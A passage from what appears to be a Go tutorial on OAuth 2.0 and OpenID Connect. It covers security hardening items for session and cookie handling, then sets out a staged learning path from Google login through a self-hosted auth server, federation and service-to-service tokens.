| **Session expiry enforcement** | Track `session.CreatedAt` and invalidate sessions older than your policy (e.g., 24 hours), even if the cookie hasn't expired. |
| **Absolute session timeout** | Regardless of activity, force re-login after N hours. |
| **Session invalidation on logout** | Already implemented — `a.sessions.Delete(sessionID)`. |
| **Refresh token rotation** | Some providers issue a new refresh token on each refresh. Store the latest one. |
| **HTTPS redirect** | Redirect all HTTP traffic to HTTPS at the infrastructure level. |
| **`Secure` cookie flag** | Uncomment `Secure: true` in `setSessionCookie`. |
| **Rate limiting on `/login` and `/callback`** | Prevent brute-force and DoS against the OAuth endpoints. |
| **Use `sub` not `email` as user ID** | Email addresses can change. `sub` is stable and unique forever. |
| **Handle token revocation** | If a user revokes your app's access in their Google account, your next API call will fail. Handle `401` responses by clearing the session. |

---

## 11. Further Mastery Path

This project is Level 1. Here is the full progression from where you are now to complete mastery of OAuth 2.0 and OpenID Connect.

---

### Level 1 — Done (this project)

You have built a production-pattern web app that talks to Google as an external provider.

- Authorization Code Flow with PKCE
- CSRF protection via state parameter
- ID token cryptographic verification (signature, issuer, audience, expiry)
- Server-side sessions (opaque session ID in cookie, all data on server)
- Automatic token refresh via `oauth2.TokenSource`
- Auth middleware (`requireAuth`) as a gatekeeper
- Calling a real Google API (Drive) with an access token

**The gap at this level:** You are fully dependent on Google. If Google is down, your login is down. Your users must have a Google account. You have no control over the auth infrastructure.

---

### Level 2 — Provider Agnostic (next step)

**Goal:** Prove to yourself that the protocol is the thing, not the provider. Make your app work with multiple providers by changing only two values.

**What to build:** Refactor `main.go` so it supports multiple providers simultaneously.

```
/login/google   → Auth Code flow with Google
/login/github   → Auth Code flow with GitHub (note: GitHub uses OAuth 2.0 but not OIDC)
/login/local    → Auth Code flow with self-hosted server (localhost:9000)

/callback       → Single shared callback that identifies which provider was used
```

**The key insight you will confirm:** The callback handler — state verification, PKCE, token exchange, ID token verification, session creation — is **identical** for every provider. Only the `oidc.NewProvider()` URL and the client credentials differ.

```go
// All of these work with the exact same callback code:
providers := map[string]*oidc.Provider{
    "google": oidc.NewProvider(ctx, "https://accounts.google.com"),
    "local":  oidc.NewProvider(ctx, "http://localhost:9000"),
}
```

**Mastery signal:** When you add a third provider (e.g. Okta) by adding one entry to a map and two environment variables, with zero changes to the callback logic.

---

### Level 3 — Self-Hosted Auth Server

**Goal:** Become the provider. Stop depending on Google for authentication entirely.

**What to build:** Move to the `../self-hosted/` directory. You now run your own auth server that issues JWTs signed with your own RSA key. Your apps are completely independent of any third party for authentication.

```
external-providers/main.go   → points at https://accounts.google.com
self-hosted/webapp/main.go   → points at http://localhost:9000

Change: two strings.
Everything else: identical.
```

**What you learn by building the auth server:**
- How JWTs are actually constructed and signed (RSA-SHA256, base64url encoding)
- What OIDC Discovery is and why it matters (how clients auto-configure)
- How JWKS works (public key distribution for signature verification)
- How PKCE is verified server-side (SHA-256 challenge/verifier check)
- Why access tokens and ID tokens have different audiences
- How device flow polling works at the HTTP level
- How client credentials flow eliminates users from the picture entirely

**Mastery signal:** You can explain why `go-oidc`'s `verifier.Verify()` produces the same result whether the token came from Google or your `localhost:9000` server. The answer: it only cares about the RSA signature and the claims. The signer's identity is irrelevant as long as the math checks out.

---

### Level 4 — Hybrid Federation

**Goal:** Run your own auth server that also accepts Google/GitHub login internally. Your apps talk to one server. That server handles the federation.

```
Your Apps → Your Auth Server → (optionally) → Google / GitHub / LDAP
                            ↓
                    Issues uniform tokens
                    to all your services
                    regardless of how
                    the user authenticated
```

**What to build:** Add an "external identity provider" flow to `self-hosted/authserver/main.go`:
1. Add a `/login/google` endpoint on the auth server itself
2. The auth server does the OAuth flow with Google (it becomes the client)
3. On success, the auth server creates a local user (or maps to existing) and issues its own JWT
4. Your webapp and APIs never see Google's tokens — only your auth server's tokens

**Why this matters in production:**
- One consistent token format for all your services
- Add/remove external providers without touching your apps
- Merge accounts (user who logged in via Google and via password are the same person)
- Enforce your own session and MFA policies on top of external providers

**Mastery signal:** A user logs in with Google on your webapp. Your webapp's session token has `iss: "http://auth.yourdomain.com"` — not Google's issuer. Your apps are completely decoupled from Google at the token level.

---

### Level 5 — Machine-to-Machine at Scale

**Goal:** Extend self-hosted auth to cover all server-to-server communication in a multi-service architecture.

**What to build:**

```
Service Registry (in Keycloak/authserver):
  payment-service:   secret, allowed scopes: [payments:process]
  inventory-service: secret, allowed scopes: [inventory:read, inventory:write]
  reporting-service: secret, allowed scopes: [transactions:read, inventory:read]
  notification-service: secret, allowed scopes: [notifications:send]
```

Each service gets a token from the auth server at startup. Every inter-service HTTP call carries a Bearer token. Each service validates tokens locally using the JWKS public key.

**Advanced patterns to add:**
- Token exchange ([RFC 8693](https://datatracker.ietf.org/doc/html/rfc8693)): Service A acts on behalf of a user when calling Service B — the user's token is "exchanged" for a new token with Service B as the audience
- Short-lived tokens (5–15 minutes) with no refresh tokens for M2M — simpler and more secure than long-lived tokens when calling `/token` is cheap

**Mastery signal:** You can draw the full token flow for a request that goes: Browser → API Gateway → Auth Service → Payment Service → Notification Service, showing which token each leg uses and why.

---

### Level 6 — Mastery Proof

**The test:** Take `self-hosted/webapp/main.go`. Change one line:

```go
// From:
provider, _ := oidc.NewProvider(ctx, "http://localhost:9000")

// To:
provider, _ := oidc.NewProvider(ctx, "https://your-keycloak.yourdomain.com/realms/myrealm")
```

Update the client credentials. Run the webapp. It works — login, session, token refresh, everything.

Then change it to point at Okta. It works.
Then change it back to `localhost:9000`. It works.

**If this feels obvious to you — you have mastered the protocol.**

The app does not know or care which server issued the tokens. It only knows the OIDC Discovery URL and its client credentials. The rest is mathematics: RSA signatures, base64url encoding, JSON claims. The source of those signatures is irrelevant as long as they verify correctly against the JWKS public keys.

That is what "OAuth 2.0 and OpenID Connect are protocols, not products" means in practice.
